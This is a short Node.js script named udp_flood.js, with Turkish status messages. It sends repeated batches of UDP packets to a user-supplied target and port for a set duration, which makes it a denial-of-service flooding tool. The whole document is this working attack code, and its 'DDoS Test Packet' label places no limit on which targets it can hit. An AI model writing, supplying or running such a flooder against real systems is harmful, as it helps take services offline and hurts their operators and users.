// udp_flood.js
const dgram = require('dgram');
const end = Date.now() + (params.duration * 1000);

console.log(`[+] UDP Flood başladı: ${params.target}:${params.port}`);

while (Date.now() < end) {
    const client = dgram.createSocket('udp4');
    const message = Buffer.from('DDoS Test Packet');
    
    for (let i = 0; i < (params.requests || 100); i++) {
        client.send(message, params.port, params.target, () => {});
    }
    
    client.close();
}

console.log(`[+] UDP Flood bitti`);
